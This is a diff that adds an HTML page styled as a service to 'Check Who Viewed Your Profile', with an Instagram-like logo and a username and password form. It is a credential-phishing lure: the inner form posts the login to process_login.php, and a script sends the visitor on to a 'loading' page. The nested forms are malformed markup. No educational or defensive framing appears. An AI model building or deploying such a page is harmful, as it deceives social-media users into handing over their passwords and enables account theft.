@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign Up</title>
+  <style>
+    body {
+  background-color: #000000;
+  font-family: Arial, sans-serif;
+  color: white;
+  font-weight: 300; /* Makes all text lighter */
+}
+
+.container {
+  width: 420px; /* Increased width for the container */
+  margin: 100px auto;
+  background-color: #000000;
+  padding: 20px;
+  border-radius: 5px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  text-align: center;
+  border: 1px solid #8b8b8b;
+}
+
+h1 {
+  font-size: 24px;
+  margin-bottom: 20px;
+  font-weight: 300;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  align-items: center; /* Center-align the form elements */
+}
+
+label {
+  font-weight: 300;
+  margin-bottom: 5px;
+  color: white;
+  width: 100%; /* Full width for label alignment */
+  max-width: 380px; /* Align with input box */
+  text-align: left; /* Align label text to the left */
+  padding-left: 5px; /* Add padding for alignment with input text */
+}
+
+input[type="text"],
+input[type="password"],
+input[type="submit"] {
+  padding: 10px;
+  margin-bottom: 15px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  width: 100%; /* Full width for input boxes */
+  max-width: 380px; /* Increased width for alignment with the container */
+  box-sizing: border-box;
+  color: white;
+  background-color: #000000;
+}
+
+input[type="submit"] {
+  background-color: #ff4081;
+  color: white;
+  cursor: pointer;
+}
+
+input[type="submit"]:hover {
+  background-color: #e91e63;
+}
+
+    .logo {
+      width: 100px; /* Adjust width as needed */
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Add the logo image here -->
+    <img src="Ig_Icon.png" alt="Logo" class="logo">
+    <h1>Check Who Viewed Your Profile</h1>
+    <form onsubmit="redirectToLoadingPage(event)" method="post">
+      <form action="process_login.php" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <input type="submit" value="Sign Up">
+      </form>
+    </form>
+    
+    <script>
+      function redirectToLoadingPage(event) {
+        event.preventDefault(); // Prevents the form from submitting
+        window.location.href = "loading.html"; // Redirects to the loading page
+      }
+    </script>
+    
+    
+  </div>
+</body>
+</html>
